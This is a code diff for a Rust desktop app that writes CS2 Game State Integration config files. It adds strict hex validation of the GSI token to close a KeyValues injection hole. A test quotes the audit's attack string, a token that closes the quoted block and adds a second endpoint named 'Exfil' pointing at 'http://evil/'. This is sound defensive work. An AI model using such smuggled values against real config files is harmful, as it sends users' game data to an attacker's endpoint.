@@ -353,8 +353,24 @@ static GSI_STARTED: AtomicBool = AtomicBool::new(false);
 // body and OOM the whole app before we even authenticate the request.
 const GSI_MAX_BODY: u64 = 256 * 1024;
 
+/* The token is embedded VERBATIM between two quotes in a KeyValues file, so its shape is a
+   security property, not a formatting detail. The comment above gsi_config_body used to assert
+   "token is app-minted hex" — true of a fresh install, false on any machine that has restored
+   a backup: validBackup never inspected settings, so settings.gsiToken was fully attacker-
+   controlled. A token carrying a quote and a newline closes our block and opens a second one,
+   giving CS2 a second GSI endpoint pointed anywhere. Validate here, where it is trusted, not
+   only in the frontend that can be replaced.
+   NOT a #[tauri::command] — it is an internal helper, and it must sit ABOVE the attribute so
+   the attribute stays attached to start_gsi. */
+fn gsi_token_ok(t: &str) -> bool {
+    t.len() == 32 && t.chars().all(|c| c.is_ascii_hexdigit() && !c.is_ascii_uppercase())
+}
+
 #[tauri::command]
 fn start_gsi(app: tauri::AppHandle, port: u16, token: String) -> Result<(), String> {
+    if !gsi_token_ok(&token) {
+        return Err("refused: malformed GSI token".into());
+    }
     // idempotent: the frontend calls this on every boot, but one listener per process is enough.
     if GSI_STARTED.swap(true, Ordering::SeqCst) {
         return Ok(());
@@ -601,6 +617,10 @@ fn gsi_config_body(token: &str, port: u16) -> String {
 // This is the only place the app writes into the CS2 folder, and only on an explicit button.
 #[tauri::command]
 fn write_gsi_config(token: String, port: u16) -> Result<String, String> {
+    // same gate as start_gsi, so the cfg and the listener can never disagree about the token
+    if !gsi_token_ok(&token) {
+        return Err("refused: malformed GSI token".into());
+    }
     let root = steam_root().ok_or("Couldn't find Steam")?;
     let libs = steam_libraries(&root).ok_or("Couldn't read Steam libraries")?;
     for lib in libs {
@@ -624,7 +644,7 @@ fn write_gsi_config(token: String, port: u16) -> Result<String, String> {
 
 #[cfg(test)]
 mod tests {
-    use super::{gsi_config_body, gsi_is_self, gsi_result, quoted_after, track_round, RoundTracker};
+    use super::{gsi_config_body, gsi_is_self, gsi_result, gsi_token_ok, quoted_after, track_round, RoundTracker};
 
     // Payloads shaped like the ones CS2 actually posts, so the pointers are exercised for real.
     fn payload(rphase: &str, round: i64, health: i64, money: i64, equip: i64, kills: i64) -> serde_json::Value {
@@ -700,6 +720,35 @@ mod tests {
     // the round ENDS while you are still dead. Gating the whole state machine on is_self meant
     // the "over" edge arrived on a spectated payload, was never seen, and the round vanished —
     // so the feature recorded zero deaths, forever, while every test stayed green.
+    // The token goes verbatim into a KeyValues file. A backup can carry any string here —
+    // validBackup only ever inspected sessions and plan — so a quote plus a newline closes our
+    // block and opens a second one, handing CS2 a second GSI endpoint pointed anywhere. The
+    // frontend now re-mints anything malformed, but the frontend is the replaceable half.
+    #[test]
+    fn a_token_that_could_escape_the_keyvalues_quoting_is_refused() {
+        let good = "a1b2c3d4e5f60718293a4b5c6d7e8f90";
+        assert!(gsi_token_ok(good), "32 lowercase hex is what randToken mints");
+        // the actual attack shape from the audit
+        assert!(!gsi_token_ok("a\"\n}\n\"Exfil\"\n{\n\"uri\" \"http://evil/\"\n"));
+        assert!(!gsi_token_ok(""), "empty");
+        assert!(!gsi_token_ok("a1b2c3d4e5f60718293a4b5c6d7e8f9"), "31 chars");
+        assert!(!gsi_token_ok("a1b2c3d4e5f60718293a4b5c6d7e8f900"), "33 chars");
+        assert!(!gsi_token_ok("A1B2C3D4E5F60718293A4B5C6D7E8F90"), "uppercase is not our shape");
+        assert!(!gsi_token_ok("a1b2c3d4e5f60718293a4b5c6d7e8f9g"), "non-hex");
+        assert!(!gsi_token_ok("a1b2c3d4-e5f6-0718-293a-4b5c6d7e"), "hyphens");
+    }
+
+    // A refused token must also never reach the file: assert the body only ever contains a
+    // token we would accept, so the guard cannot be bypassed by a future caller.
+    #[test]
+    fn the_written_cfg_carries_only_a_well_formed_token() {
+        let body = gsi_config_body("a1b2c3d4e5f60718293a4b5c6d7e8f90", 3121);
+        assert!(body.contains("\"token\" \"a1b2c3d4e5f60718293a4b5c6d7e8f90\""));
+        // one block, one uri — a second of either means something escaped the quoting
+        assert_eq!(body.matches("\"uri\"").count(), 1);
+        assert_eq!(body.matches("127.0.0.1").count(), 1);
+    }
+
     #[test]
     fn dying_and_then_spectating_still_records_the_round() {
         let mut tr = RoundTracker::default();
